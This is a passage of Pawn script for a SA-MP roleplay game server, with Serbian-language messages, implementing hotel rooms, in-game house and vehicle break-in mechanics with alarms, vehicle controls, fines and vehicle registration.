   	else if( !strcmp( hotelInfo[ hid ][ hGuest_2 ], "Niko", true ) ) {
		strmid( hotelInfo[ hid ][ hGuest_2 ], ImeIgraca( playerid ), 0, strlen( ImeIgraca( playerid ) ), MAX_PLAYER_NAME  );
	}
	else if( !strcmp( hotelInfo[ hid ][ hGuest_3 ], "Niko", true ) ) {
		strmid( hotelInfo[ hid ][ hGuest_3 ], ImeIgraca( playerid ), 0, strlen( ImeIgraca( playerid ) ), MAX_PLAYER_NAME  );
	}
	else if( !strcmp( hotelInfo[ hid ][ hGuest_4 ], "Niko", true ) ) {
		strmid( hotelInfo[ hid ][ hGuest_4 ], ImeIgraca( playerid ), 0, strlen( ImeIgraca( playerid ) ), MAX_PLAYER_NAME  );
	}
	else if( !strcmp( hotelInfo[ hid ][ hGuest_5 ], "Niko", true ) ) {
		strmid( hotelInfo[ hid ][ hGuest_5 ], ImeIgraca( playerid ), 0, strlen( ImeIgraca( playerid ) ), MAX_PLAYER_NAME  );
	}
	else if( !strcmp( hotelInfo[ hid ][ hGuest_6 ], "Niko", true ) ) {
		strmid( hotelInfo[ hid ][ hGuest_6 ], ImeIgraca( playerid ), 0, strlen( ImeIgraca( playerid ) ), MAX_PLAYER_NAME  );
	}
	else if( !strcmp( hotelInfo[ hid ][ hGuest_7 ], "Niko", true ) ) {
		strmid( hotelInfo[ hid ][ hGuest_7 ], ImeIgraca( playerid ), 0, strlen( ImeIgraca( playerid ) ), MAX_PLAYER_NAME  );
	}
	else if( !strcmp( hotelInfo[ hid ][ hGuest_8 ], "Niko", true ) ) {
		strmid( hotelInfo[ hid ][ hGuest_8 ], ImeIgraca( playerid ), 0, strlen( ImeIgraca( playerid ) ), MAX_PLAYER_NAME  );
	}
	else if( !strcmp( hotelInfo[ hid ][ hGuest_9 ], "Niko", true ) ) {
		strmid( hotelInfo[ hid ][ hGuest_9 ], ImeIgraca( playerid ), 0, strlen( ImeIgraca( playerid ) ), MAX_PLAYER_NAME  );
	}
	else if( !strcmp( hotelInfo[ hid ][ hGuest_10 ], "Niko", true ) ) {
		strmid( hotelInfo[ hid ][ hGuest_10 ], ImeIgraca( playerid ), 0, strlen( ImeIgraca( playerid ) ), MAX_PLAYER_NAME  );
	}
	else return SCM( playerid, BELA, "Recepcionarka: Zao nam je ali sve su sobe iznajmljene." );
	
	PlayerInfo[ playerid ][ xHotelRoom ] = hid;
	DajIgracuNovac( playerid, -hotelInfo[ hid ][ hRoomPrice ] );
	hotelInfo[ hid ][ hMoney ] += hotelInfo[ hid ][ hRoomPrice ];
	SCM( playerid, BELA, "Recepcionarka: Evo vaseg kljuca, uzivajte." );
    
	return true;
}

CMD:odjavisobu( playerid, params[] ) {
	if( PlayerInfo[ playerid ][ xHotelRoom ] == -1 ) return SendErrorMessage( playerid, "Nemate iznajmljenu sobu." );
	if( !IsPlayerInRangeOfPoint( playerid, 3.0, 2217.3083, -1146.4053, 1025.7969 ) ) return SendErrorMessage( playerid, "Nisi na salteru u hotelu." );
    if( inHotel[ playerid ] == -1 ) return SendErrorMessage( playerid, "Nisi na salteru u hotelu." );

	new hid = inHotel[ playerid ];

    if( strcmp( ImeIgraca( playerid ), hotelInfo[ hid ][ hGuest_1 ], true ) == 0) {
        strmid( hotelInfo[ hid ][ hGuest_1 ], "Niko", 0, strlen( "Niko" ), MAX_PLAYER_NAME );
	}
	else if( strcmp( ImeIgraca( playerid ), hotelInfo[ hid ][ hGuest_2 ], true ) == 0) {
        strmid( hotelInfo[ hid ][ hGuest_2 ], "Niko", 0, strlen( "Niko" ), MAX_PLAYER_NAME );
	}
	else if( strcmp( ImeIgraca( playerid ), hotelInfo[ hid ][ hGuest_3 ], true ) == 0) {
        strmid( hotelInfo[ hid ][ hGuest_3 ], "Niko", 0, strlen( "Niko" ), MAX_PLAYER_NAME );
	}
	else if( strcmp( ImeIgraca( playerid ), hotelInfo[ hid ][ hGuest_4 ], true ) == 0) {
        strmid( hotelInfo[ hid ][ hGuest_4 ], "Niko", 0, strlen( "Niko" ), MAX_PLAYER_NAME );
	}
	else if( strcmp( ImeIgraca( playerid ), hotelInfo[ hid ][ hGuest_5 ], true ) == 0) {
        strmid( hotelInfo[ hid ][ hGuest_5 ], "Niko", 0, strlen( "Niko" ), MAX_PLAYER_NAME );
	}
	else if( strcmp( ImeIgraca( playerid ), hotelInfo[ hid ][ hGuest_6 ], true ) == 0) {
        strmid( hotelInfo[ hid ][ hGuest_6 ], "Niko", 0, strlen( "Niko" ), MAX_PLAYER_NAME );
	}
	else if( strcmp( ImeIgraca( playerid ), hotelInfo[ hid ][ hGuest_7 ], true ) == 0) {
        strmid( hotelInfo[ hid ][ hGuest_7 ], "Niko", 0, strlen( "Niko" ), MAX_PLAYER_NAME );
	}
	else if( strcmp( ImeIgraca( playerid ), hotelInfo[ hid ][ hGuest_8 ], true ) == 0) {
        strmid( hotelInfo[ hid ][ hGuest_8 ], "Niko", 0, strlen( "Niko" ), MAX_PLAYER_NAME );
	}
	else if( strcmp( ImeIgraca( playerid ), hotelInfo[ hid ][ hGuest_9 ], true ) == 0) {
        strmid( hotelInfo[ hid ][ hGuest_9 ], "Niko", 0, strlen( "Niko" ), MAX_PLAYER_NAME );
	}
	else if( strcmp( ImeIgraca( playerid ), hotelInfo[ hid ][ hGuest_10 ], true ) == 0) {
        strmid( hotelInfo[ hid ][ hGuest_10 ], "Niko", 0, strlen( "Niko" ), MAX_PLAYER_NAME );
	}
	else return SendErrorMessage( playerid, "Niste iznajmili sobu u ovom hotelu." );
	
	PlayerInfo[ playerid ][ xHotelRoom ] = -1;
	SCM( playerid, BELA, "Recepcionarka: Uspesno ste odjavili sobu, dodjite nam opet." );
	SaveHotel( hid );
	return true;
}

CMD:breakdoor( playerid, params[] ) {
    for( new i = 1; i < MAX_IMOVINA; i++) {
		if( IsPlayerInRangeOfPoint( playerid, 2, II[  i][ iEnter ][ 0 ], II[  i][ iEnter ][ 1 ], II[  i][ iEnter ][ 2 ] ) ) {
			if( strcmp( II[ i ][ iOwner ], ImeIgraca( playerid ), false ) ) {
   				if( PlayerInfo[ playerid ][ xToolkit ] == false) {
       				SendErrorMessage( playerid, "Nemas alat za obijanje brava!" );
					return 1;
				}
				if( GetPVarInt( playerid, "Pokusaj") != 0 ) {
    				SCM( playerid, CRVENA, "Vec ste u procesu provaljivanja!" );
					return 1;
				}
				if( II[ i ][ iLocked ] == 1) {
				    if( II[ i ][ iAlarm ] == 4)
					{
					    foreach( Player, h )
						{
							if( IsPlayerConnected( h ) )
							{
					   			if( strcmp( ImeIgraca( h ), II[ i ][ iOwner ], true) == 0 )
					   			{
					   			    SCM( h, ZUTA, "SMS: Netko vam pokusava provaliti u kucu, Vas Alarm!" );
				   				}
							}
						}
						for( new id = 1; id < MAX_ORG; id++) {
		    				if( OI[ id ][ oTip ] == ORG_TIP_PD ) {
								OrgPoruka( id, 0x2641FEAA, "HQ: Svim jedinicama: Prijavio: Tihi Alarm" );
								OrgPoruka( id, 0x2641FEAA, "HQ: Zlocin: Provala u kucu    ||  Osumljiceni: Nepoznat" );
								format( globalstring, sizeof( globalstring ), "HQ: Adresa kuce: %s", II[ i ][ iAdress ] );
								OrgPoruka( id, 0x2641FEAA, globalstring);
							}
						}
					}
				    if( II[ i ][ iLockLevel ] == 0) {
				        SCM( playerid, BELA, "Pokusavate provaliti bravu na kucnim vratima.(30 sec!)");
						SetTimerEx("Provala", 30000, 0, "i", playerid); Odbrojavanje[ playerid ] = 30;
					}
					else if( II[ i ][ iLockLevel ] == 1) {
					    SCM( playerid, BELA, "Pokusavate provaliti bravu na kucnim vratima.(60 sec!)");
					    SetTimerEx("Provala", 60000, 0, "i", playerid); Odbrojavanje[ playerid ] = 60;
					}
					else if( II[ i ][ iLockLevel ] == 2) {
					    SCM( playerid, BELA, "Pokusavate provaliti bravu na kucnim vratima.(2 min!)");
					    SetTimerEx("Provala", 120000, 0, "i", playerid); Odbrojavanje[ playerid ] = 120;
					}
					else if( II[ i ][ iLockLevel ] == 3) {
					    SCM( playerid, BELA, "Pokusavate provaliti bravu na kucnim vratima.(4 min!)");
					    SetTimerEx("Provala", 240000, 0, "i", playerid); Odbrojavanje[ playerid ] = 240;
					}
					else if( II[ i ][ iLockLevel ] == 4) {
					    SCM( playerid, BELA, "Pokusavate provaliti bravu na kucnim vratima.(8 min!)");
					    SetTimerEx("Provala", 480000, 0, "i", playerid); Odbrojavanje[ playerid ] = 480;
					}
				    VremeTDControl( playerid, true );
     				format( globalstring, sizeof( globalstring ), "* %s uzima alat i pokusava obiti bravu na vratima.", ImeIgraca( playerid ) );
			      	PorukaRadius( 15.0, playerid, globalstring, LJUBICASTA );
					TogglePlayerControllable( playerid, false );
					SetPVarInt( playerid, "Pokusaj", 1 );
					PlayerInfo[ playerid ][ xToolkit ] = false;
				}
				else {
					SCM( playerid, CRVENA, "Vrata su otkljucana!");
					return 1;
				}
			}
			else {
				GameTextForPlayer( playerid, "~r~Necete valjda sami sebi razvaliti vrata?", 2000, 6);
				return 1;
			}
		}
	}
	return 1;
}

CMD:prekiniobijanje( playerid, params[] ) {
    if( GetPVarInt( playerid, "BreakingLock" ) == 1 ) {
		TogglePlayerControllable( playerid, true );

		Novi_KillTimer( GetPVarInt( playerid, "BreakLockTimer" ) );
		Novi_KillTimer( GetPVarInt( playerid, "breakcounttimer" ) );
		SetPVarInt( playerid, "BreakLockTimerCalled", 0 );
		SetPVarInt( playerid, "BreakingLock", 0 );
	}
	else if( GetPVarInt( playerid, "StartingVehicle" ) == 1 ) {
		TogglePlayerControllable( playerid, true );
		Novi_RemovePlayerFromVehicle( playerid );

		Novi_KillTimer( GetPVarInt( playerid, "EngineStartTimer" ) );
		Novi_KillTimer( GetPVarInt( playerid, "immobcounttimer" ) );

		SetPVarInt( playerid, "ImmobTimerCalled", 0 );
		SetPVarInt( playerid, "StartingVehicle", 0 );
	}
    else if(GetPVarInt( playerid, "Pokusaj") == 1) {
 		TogglePlayerControllable( playerid, true );
		SetPVarInt( playerid, "Pokusaj", 0);
		Odbrojavanje[ playerid ] = 0;
    	VremeTDControl( playerid, false );
	} else SendErrorMessage( playerid, "Ova komanda sluzi da prekines provaljivanje!");
	return 1;
}

CMD:smashdoor( playerid, params[] ) {
    for( new i = 1; i < MAX_IMOVINA; i++) {
		if( IsPlayerInRangeOfPoint( playerid, 2, II[  i][ iEnter ][ 0 ], II[  i][ iEnter ][ 1 ], II[  i][ iEnter ][ 2 ] ) ) {
			if( strcmp( II[ i ][ iOwner ], ImeIgraca( playerid ), false ) ) {
				if(GetPVarInt( playerid, "Pokusaj") != 0) {
    				SendErrorMessage( playerid, "Ne mozete koristiti ovu komandu dok ste u procesu provaljivanja!");
					return 1;
				}
				if( II[ i ][ iLocked ] == 1) {
				    if( II[ i ][ iDoorLevel ] == 0) {
				        if( PlayerInfo[ playerid ][ xSnaga ] < 4) {
				            SCM( playerid, CRVENA, "Vrata su precvrsta!");
				            return 1;
						}
				        SendInfoMessage( playerid, "Uspjeli ste razbiti vrata na snagu.Vrata su se otvorila.");
				        II[ i ][ iLocked ] = 0;
					}
					else if( II[ i ][ iDoorLevel ] == 1) {
					    if( PlayerInfo[ playerid ][ xSnaga ] < 7) {
				            SCM( playerid, CRVENA, "Vrata su precvrsta!");
				            return 1;
						}
				        SendInfoMessage( playerid, "Uspjeli ste razbiti vrata na snagu.Vrata su se otvorila.");
				        II[ i ][ iLocked ] = 0;
					}
					else if( II[ i ][ iDoorLevel ] == 2) {
					    if( PlayerInfo[ playerid ][ xSnaga ] < 10) {
				            SCM( playerid, CRVENA, "Vrata su precvrsta!");
				            return 1;
						}
				        SendInfoMessage( playerid, "Uspjeli ste razbiti vrata na snagu.Vrata su se otvorila.");
				        II[ i ][ iLocked ] = 0;
					}
					else if( II[ i ][ iDoorLevel ] == 3) {
					    if( PlayerInfo[ playerid ][ xSnaga ] < 15) {
				            SCM( playerid, CRVENA, "Vrata su precvrsta!");
				            return 1;
						}
				        SendInfoMessage( playerid, "Uspjeli ste razbiti vrata na snagu.Vrata su se otvorila.");
				        II[ i ][ iLocked ] = 0;
					}
					else if( II[ i ][ iDoorLevel ] == 4) {
					    if( PlayerInfo[ playerid ][ xSnaga ] < 20) {
				            SCM( playerid, CRVENA, "Vrata su precvrsta!");
				            return 1;
						}
				        SendInfoMessage( playerid, "Uspjeli ste razbiti vrata na snagu.Vrata su se otvorila.");
				        II[ i ][ iLocked ] = 0;
					}
					else if( II[ i ][ iDoorLevel ] == 5) {
					    SCM( playerid, CRVENA, "Vrata su precvrsta da bi ih obican covjek razbio!");
					    return 1;
					}
					if( II[ i ][ iAlarm ] > 0)
					{
						if( II[ i ][ iAlarm ] >= 2)
						{
						    foreach( Player, h )
							{
								if( IsPlayerConnected( h ) )
								{
						   			if( strcmp( ImeIgraca( h ), II[ i ][ iOwner ], true) == 0 )
						   			{
						   			    SCM( h, ZUTA, "SMS: Netko vam je provalio u kucu!Pozovite policiju, Vas Alarm!");
					   				}
								}
							}
						}
						if( II[ i ][ iAlarm ] >= 3)
						{
						    for( new id = 1; id < MAX_ORG; id++) {
		    					if( OI[ id ][ oTip ] == ORG_TIP_PD ) {
									OrgPoruka( id, 0x2641FEAA, "HQ: Svim jedinicama: Prijavio: Alarm");
									OrgPoruka( id, 0x2641FEAA, "HQ: Zlocin: Provala u kucu    ||  Osumljiceni: Nepoznat");
									format( globalstring, sizeof( globalstring ), "HQ: Adresa kuce: %s", II[ i ][ iAdress ] );
									OrgPoruka( id, 0x2641FEAA, globalstring);
								}
							}
						}
						format( globalstring, sizeof( globalstring ), "[%s ALARM] BEEP BEEP BEEP!!", II[ i ][ iAdress ] );
						PorukaRadius(60.0, playerid, globalstring, LJUBICASTA );
					}
     				format( globalstring, sizeof( globalstring ), "* %s se zaljece i udara nogom u vrata.", ImeIgraca( playerid ) );
			      	PorukaRadius(15.0, playerid, globalstring, LJUBICASTA );
			      	ApplyAnimation( playerid, "POLICE", "Door_Kick", 4.0, 0, 0, 0, 0, 0, 1);
			      	ApplyAnimation( playerid, "POLICE", "Door_Kick", 4.0, 0, 0, 0, 0, 0, 1);
					return 1;
				}
				else {
					SCM( playerid, CRVENA, "Vrata su otkljucana!" );
					return 1;
				}
			}
			else {
				SendErrorMessage( playerid, "Ne mozes sam sebi razvalit vrata!" );
				return 1;
			}
		}
	}
	return 1;
}

// Veh System

CMD:hauba( playerid, params[] ) {
    new engine,lights,alarm,doors,bonnet,boot,objective,
		vehicle = GetPlayerVehicleID(playerid);
	if( GetPlayerState( playerid ) != PLAYER_STATE_DRIVER) {
		SCM( playerid, CRVENA, "Morate biti vozac da bi ste mogli koristit ovu komandu.");
		return 1;
	}
	if( IsVehicleBajs( vehicle ) || IsVehicleMotor( vehicle ) || IsVehicleBrod( vehicle ) ) {
		SendErrorMessage( playerid, "Nepoznata akcija.");
		return 1;
	}
	GetVehicleParamsEx( vehicle, engine, lights, alarm, doors, bonnet, boot, objective );
	if( bonnet == 0) {
		SetVehicleParamsEx( vehicle,engine,lights,alarm,doors,1,boot,objective);
	} else {
		SetVehicleParamsEx( vehicle,engine,lights,alarm,doors,0,boot,objective);
	}
	return 1;
}

CMD:svetla( playerid, params[] ) {
    new engine,lights,alarm,doors,bonnet,boot,objective,
		vehicle = GetPlayerVehicleID(playerid);
	if( GetPlayerState( playerid ) != PLAYER_STATE_DRIVER ) {
		SCM( playerid, CRVENA, "Morate biti vozac da bi ste mogli koristit ovu komandu." );
		return 1;
	}
	if( IsVehicleBajs( vehicle ) || IsVehicleBrod( vehicle ) ) {
		SendErrorMessage( playerid, "Nepoznata akcija." );
		return 1;
	}
	GetVehicleParamsEx( vehicle, engine, lights, alarm, doors, bonnet, boot, objective );
	if( lights == 0 ) {
		SetVehicleParamsEx( vehicle,engine,1,alarm,doors,bonnet,boot,objective);
	} else {
		SetVehicleParamsEx( vehicle,engine,0,alarm,doors,bonnet,boot,objective);
	}
	return 1;
}

CMD:gepek( playerid, params[] ) {
 	new vehicleid, found;
    for( new i = 0; i < MAX_VEHICLES; i++)
    {
        new Float:X, Float:Y, Float:Z;
        GetVehiclePos(i, X, Y, Z);
        if( IsPlayerInRangeOfPoint( playerid, 5.0, X, Y, Z)) {
            vehicleid = i;
            found = 1;
            break;
        }
        else
            continue;
    }
	if( found == 0 ) return SendErrorMessage( playerid, "Niste blizu vozila.");

    new Float:vehPos[ 3 ];
	getPosBehindVehicle( vehicleid, vehPos[ 0 ], vehPos[ 1 ], vehPos[ 2 ], 0.0 );
	if( !IsPlayerInRangeOfPoint( playerid, 2, vehPos[ 0 ], vehPos[ 1 ], vehPos[ 2 ] ) ) return SendErrorMessage( playerid, "Morate biti pored prtljaznika." );

	if( IsANoTrunkVehicle( vehicleid ) ) return SendErrorMessage( playerid, "Ovo vozilo nema prtljaznik!");
	if( GetPlayerState( playerid ) != PLAYER_STATE_ONFOOT ) return SendErrorMessage( playerid, "Morate biti na nogama da biste zatvorili/otvorili prtljaznik.");
	if( IsVehicleBajs( vehicleid ) || IsVehicleMotor( vehicleid ) || IsVehicleBrod( vehicleid ) ) {
		SendErrorMessage( playerid, "Nepoznata akcija.");
		return 1;
	}
	
	if(!PrivatnoVozilo(vehicleid)) return SendErrorMessage( playerid, "Ovo vozilo nije privatno vozilo!" );
	
	SPD( playerid, dialog_GEPEK, DSL, D_NASLOV, "Otvori/Zatvori gepek\nInformacije\nOstavi\nIzvadi", D_ODABERI, D_NAZAD );
	return 1;
}

CMD:upalivozilo( playerid, params[] ) {
    if( IsPlayerConnected( playerid ) ) {
		new vehicle = GetPlayerVehicleID( playerid );

	    if( !IsPlayerInAnyVehicle( playerid )) return SendErrorMessage( playerid, "Morate biti u vozilu da biste koristili ovu komandu!");
	 	if( vCanDrive[ vehicle ] == 0 ) return SendErrorMessage( playerid, "Ovo vozilo je unisteno i ne moze se pokrenuti.");
	    if( IsVehicleBajs( vehicle ) ) return SendErrorMessage( playerid, "Stvarno mislis upaliti biciklu? " );
		if( GetPlayerState( playerid ) != PLAYER_STATE_DRIVER ) return SendErrorMessage( playerid, "Morate biti vozac da bi ste mogli koristit ovu komandu.");
		if( Fuel[ vehicle ] == 0 ) return SendErrorMessage( playerid, "Vozilo nema goriva ne mozete ga upaliti." );

		if(!PrivatnoVozilo(vehicle)) return SendErrorMessage( playerid, "Nisi u nijednom privatnom vozilu." );

		new autoid = getVehicleScriptID(vehicle);

		if( VehicleInfo[ autoid ][ vOwned ] == 1 ) {
			if( strcmp( ImeIgraca( playerid ), VehicleInfo[ autoid ][ vOwner ], true) == 0 ) {
				SendErrorMessage( playerid, "Neces valjda da obijas svoje vozilo ?");
				return 1;
			}
			else {
			    if( PlayerInfo[ playerid ][ xToolkit ] == true ) {
					new time;
					switch( VehicleInfo[ autoid ][ vImobilizator ] ) {
						case 0:
				        	time = 30000;
						case 1:
						    time = 60000;
						case 2:
						    time = 120000;
						case 3:
						    time = 240000;
						case 4:
							time = 360000;
						case 5:
					    	time = 480000;
					}
					format( globalstring, sizeof( globalstring ), "* %s vadi alat za obijanje i pokusava upaliti vozilo pomocu alata.", ImeIgraca( playerid ) );
					PorukaRadius( 20.0, playerid, globalstring, LJUBICASTA );

					SCM( playerid, BELA, "Da prekinete paljenje vozila proces ukucajte /prekiniobijanje");
					TogglePlayerControllable( playerid, false );

					SetPVarInt(playerid, "EngineStartTimer", SetTimerEx("VehicleEngineStart",time,0,"i",playerid));

					SetPVarInt(playerid, "immobsecounds", (time/1000)+1);
					SetPVarInt(playerid, "immobcounttimer", SetTimerEx("ImmobCountForPlayer",1000,1,"i",playerid));
					SetPVarInt(playerid, "ImmobTimerCalled", 1);
					SetPVarInt(playerid, "StartingVehicle", 1);
					PlayerInfo[ playerid ][ xToolkit ] = false;
				} else SendErrorMessage( playerid, "Nemas alat za obijanje!");
				return 1;
			}
		}
		else {
			SendErrorMessage( playerid, "Ovo vozilo nije moguce obiti.");
			return 1;
		}
	}
	return 1;
}

CMD:obijbravu( playerid, params[] ) {
    new vehicleid, found;
    for( new i = 0; i < MAX_VEHICLES; i++ ) {
        new Float:X, Float:Y, Float:Z;
        GetVehiclePos( i, X, Y, Z );
        if( IsPlayerInRangeOfPoint( playerid, 3.0, X, Y, Z ) ) {
            vehicleid = i;
            found = 1;
            break;
        }
        else
            continue;
    }
    if( found == 0 ) {
        SendErrorMessage( playerid, "Niste blizu vozila.");
        return 1;
    }
    new i = getVehicleScriptID(vehicleid);
	if(PrivatnoVozilo(vehicleid)) {
		if( strcmp( ImeIgraca( playerid ), VehicleInfo[ i ][ vOwner ], true) == 0 ) {
			SendErrorMessage( playerid, "Necete obiti valjda svoje vozilo." );
			return 1;
		}
		else {
      		if( PlayerInfo[ playerid ][ xLevel ] < 5 || PlayerInfo[ playerid ][ xToolkit ] == false ) return SendErrorMessage( playerid, "Moras biti najmanje level 5/Nemas Alat za obijanje!");
		    if( GetPVarInt( playerid, "BreakingLock") != 0) return SendErrorMessage( playerid, "Vec si u procesu provaljivanja brave!");
			if( VehicleInfo[ i ][ vLocked ] == 0 ) return SendErrorMessage( playerid, "Auto je otkljucan!");
			new time;
		  	switch( VehicleInfo[ i ][ vLock ] ) {
				case 0:
	      			time = 30000;
				case 1:
					time = 60000;
				case 2:
					time = 120000;
				case 3:
			    	time = 240000;
				case 4:
				    time = 360000;
				case 5:
				    time = 480000;
			}
			format( globalstring, sizeof( globalstring ), "* %s vadi alat za obijanje i pokusava provaliti bravu na vozilu.", ImeIgraca( playerid ) );
			PorukaRadius( 30.0, playerid, globalstring, LJUBICASTA );
			SCM( playerid, BELA, "Da prekinete proces obijanja brave ukucajte /prekiniobijanje");

			SetPVarInt( playerid, "BreakLockTimer", SetTimerEx( "VehicleBreakLock", time, 0, "iii", playerid, vehicleid, i ) );
	        TogglePlayerControllable( playerid, 0 );

			SetPVarInt( playerid, "breaksecounds", ( time/1000 )-1 );
			SetPVarInt( playerid, "breakcounttimer", SetTimerEx( "BreakLockCountForPlayer", 1000, 1, "i", playerid ) );
			SetPVarInt( playerid, "BreakLockTimerCalled", 1 );
			SetPVarInt( playerid, "BreakingVehicle", vehicleid );

			SetPVarInt( playerid, "BreakingLock", 1 );
			PlayerInfo[ playerid ][ xToolkit ] = false;
		}
	}
	return 1;
}

CMD:lock( playerid, params[] ) {
    new vehicleid, found, autoid,
		engine, lights, alarm, doors, bonnet, boot, objective;
    for( new i = 0; i < MAX_VEHICLES; i++ ) {
        new Float:X, Float:Y, Float:Z;
        GetVehiclePos( i, X, Y, Z );
        if( IsPlayerInRangeOfPoint( playerid, 5.0, X, Y, Z ) ) {
            vehicleid = i;
            found = 1;
            break;
        }
        else
            continue;
    }
    if( found == 0 ) {
        SendErrorMessage( playerid, "Niste blizu vozila.");
        return 1;
    }
    if(PrivatnoVozilo(vehicleid)) {
    
        if( PlayerInfo[ playerid ][ xVoziloID ][ 0 ] != -1 && VehicleInfo[ PlayerInfo[ playerid ][ xVoziloID ][ 0 ] ][ vID ] == vehicleid ) { autoid = PlayerInfo[ playerid ][ xVoziloID ][ 0 ]; }
	    else if( PlayerInfo[ playerid ][ xVoziloID ][ 1 ] != -1 && VehicleInfo[ PlayerInfo[ playerid ][ xVoziloID ][ 1 ] ][ vID ] == vehicleid ) { autoid = PlayerInfo[ playerid ][ xVoziloID ][ 1 ]; }
	    else if( PlayerInfo[ playerid ][ xVoziloID ][ 2 ] != -1 && VehicleInfo[ PlayerInfo[ playerid ][ xVoziloID ][ 2 ] ][ vID ] == vehicleid ) { autoid = PlayerInfo[ playerid ][ xVoziloID ][ 2 ]; }
	    else if( PlayerInfo[ playerid ][ xVoziloID ][ 3 ] != -1 && VehicleInfo[ PlayerInfo[ playerid ][ xVoziloID ][ 3 ] ][ vID ] == vehicleid ) { autoid = PlayerInfo[ playerid ][ xVoziloID ][ 3 ]; }
        else if( PlayerInfo[ playerid ][ xRezervniKljucevi ] == getVehicleScriptID(vehicleid) ) { }
        else if( PlayerInfo[ playerid ][ xAdmin ] >= 1 ) { }
		else return SendErrorMessage( playerid, "Ovo nije vase vozilo." );
		
        GetVehicleParamsEx( vehicleid, engine, lights, alarm, doors, bonnet, boot, objective);
        if( doors == 0 ) {
            VehicleInfo[ autoid ][ vLocked ] = 1;
            SetVehicleParamsEx( vehicleid, engine, lights, alarm, 1, bonnet, boot, objective);
			format( globalstring, sizeof( globalstring ), "* %s zakljucava svoje vozilo marke %s.", ImeIgraca( playerid ), GetVehicleNameEx( GetVehicleModel( vehicleid ) ) );
			PorukaRadius( 10.0, playerid, globalstring, LJUBICASTA );
			SaveVehicle( autoid );
        }
        else if( doors == 1 ) {
            VehicleInfo[ autoid ][ vLocked ] = 0;
            SetVehicleParamsEx( vehicleid, engine, lights, alarm, 0, bonnet, boot, objective);
			format( globalstring, sizeof( globalstring ), "* %s otkljucava svoje vozilo marke %s.", ImeIgraca( playerid ), GetVehicleNameEx( GetVehicleModel( vehicleid ) ) );
			PorukaRadius( 10.0, playerid, globalstring, LJUBICASTA );
			SaveVehicle( autoid );
        }
	}
	else {
		SendErrorMessage( playerid, "Nemate kljuc ovog vozila.");
		return 1;
	}
	return 1;
}

CMD:platikaznu( playerid, params[] ) {

	if( !IsPlayerInRangeOfPoint( playerid, 3.0, 687.1774,2662.2852,-40.0651 ) ) return SendErrorMessage( playerid, "Morate biti u policijskoj stanici." );

	if( PlayerInfo[ playerid ][ xRadarBodovi ] == 0 ) return SendErrorMessage( playerid, "Imate 0 neplacenih radar bodova." );
	if( PlayerInfo[ playerid ][ xNovac ] < ( PlayerInfo[ playerid ][ xRadarBodovi ]*600 ) ) return SendErrorMessage( playerid, "Nemate %d$ za placanje %d radar poena.", ( PlayerInfo[ playerid ][ xRadarBodovi ]*600 ), PlayerInfo[ playerid ][ xRadarBodovi ] );

	DajIgracuNovac( playerid, -( PlayerInfo[ playerid ][ xRadarBodovi ]*600 ) );
	SendInfoMessage( playerid, "Platili ste %d$ i otplatili %d radar bodova.", ( PlayerInfo[ playerid ][ xRadarBodovi ]*600 ), PlayerInfo[ playerid ][ xRadarBodovi ] );
	PlayerInfo[ playerid ][ xRadarBodovi ] = 0;
    SavePlayer( playerid );
    
    return 1;
}

CMD:vozilo( playerid, params[] ) {
    new string[ 128 ];
	format( string, sizeof( string ),"%s\n%s\n%s\n%s", getVehicleName( PlayerInfo[ playerid ][ xVoziloID ][ 0 ] ), getVehicleName( PlayerInfo[ playerid ][ xVoziloID ][ 1 ] ), getVehicleName( PlayerInfo[ playerid ][ xVoziloID ][ 2 ] ), getVehicleName( PlayerInfo[ playerid ][ xVoziloID ][ 3 ] ) );
	SPD( playerid, dialog_VEHLIST, DIALOG_STYLE_LIST, D_NASLOV, string, "Odaberi", "Izlaz" );
	return true;
}

CMD:vehicle( playerid, params[] ) {
	new item[32], izbor;
	if( sscanf( params, "s[32] ", item ) ) {
		SCM( playerid, SVETLOPLAVA, "___________________________________________________________________");
		SendUsageMessage( playerid, "/vehicle [opcija]");
     	SCM( playerid, BELA, "[Opcije] list, registruj, postavitable");
        SCM( playerid, SVETLOPLAVA, "___________________________________________________________________");
		return 1;
	}
	if( strcmp( item, "registruj", true ) == 0 ) {
        if( sscanf( params, "s[32]d", item, izbor ) ) {
			SendUsageMessage( playerid, "/vehicle registruj [ broj vozila ]");
			SCM( playerid, BELA, "Listu vozila pogledajte pod /vehicle list.");
			return 1;
		}
		if( izbor == -1 || izbor == 0 || izbor > MAX_CARS ) return SendErrorMessage( playerid, "Pogresan broj vozila." );

		if( PlayerInfo[ playerid ][ xVoziloID ][ 0 ] == izbor ) { }
        else if( PlayerInfo[ playerid ][ xVoziloID ][ 1 ] == izbor ) { }
        else if( PlayerInfo[ playerid ][ xVoziloID ][ 2 ] == izbor ) { }
        else if( PlayerInfo[ playerid ][ xVoziloID ][ 3 ] == izbor ) { }
		else return SendErrorMessage( playerid, "Ne posedujete vozilo ciji ste broj uneli." );

		if( !IsPlayerInRangeOfPoint( playerid, 3.0, -1872.6650,2666.6587,3.5894 ) ) return SendErrorMessage( playerid, "Da biste koristili ovu komandu morati biti u opstini." );
		if( PlayerInfo[ playerid ][ xNovac ] < 1000 ) return SendErrorMessage( playerid, "Nemas dovoljno novca(1000$)." );
		DajIgracuNovac( playerid, - 1000 );
		VehicleInfo[ izbor ][ vTeh ] = 2; SaveVehicle( izbor );
		SCM( playerid, SVETLOPLAVA, "Overio si papire vozila, idi u policijsku stanicu da uzmes tablice." );
		return 1;
	}
	else if( strcmp( item, "uzmitablice",true) == 0)
	{
        if( sscanf( params, "s[32]d", item, izbor)) {
			SendUsageMessage( playerid, "/vehicle uzmitablice [ broj vozila ]");
			SCM( playerid, BELA, "Listu vozila pogledajte pod /vehicle list.");
			return 1;
		}
		if( izbor == -1 || izbor == 0 ) return SendErrorMessage( playerid, "Pogresan broj vozila." );

        if( PlayerInfo[ playerid ][ xVoziloID ][ 0 ] == izbor ) { }
        else if( PlayerInfo[ playerid ][ xVoziloID ][ 1 ] == izbor ) { }
        else if( PlayerInfo[ playerid ][ xVoziloID ][ 2 ] == izbor ) { }
        else if( PlayerInfo[ playerid ][ xVoziloID ][ 3 ] == izbor ) { }
		else return SendErrorMessage( playerid, "Ne posedujete vozilo ciji ste broj uneli." );

		if( !IsPlayerInRangeOfPoint( playerid, 3.0, 656.0103,2543.3245,-89.4551 ) ) return SendErrorMessage( playerid, "Morate biti u policijskoj stanici." );
        if( VehicleInfo[ izbor ][ vTeh ] != 2 ) return SendErrorMessage( playerid, "Nisi overio papire u opstini!");
		if( PlayerInfo[ playerid ][ xNovac ] < 100 ) return SendErrorMessage( playerid, "Nemas dovoljno novca(100$)." );
        DajIgracuNovac( playerid, - 100 );
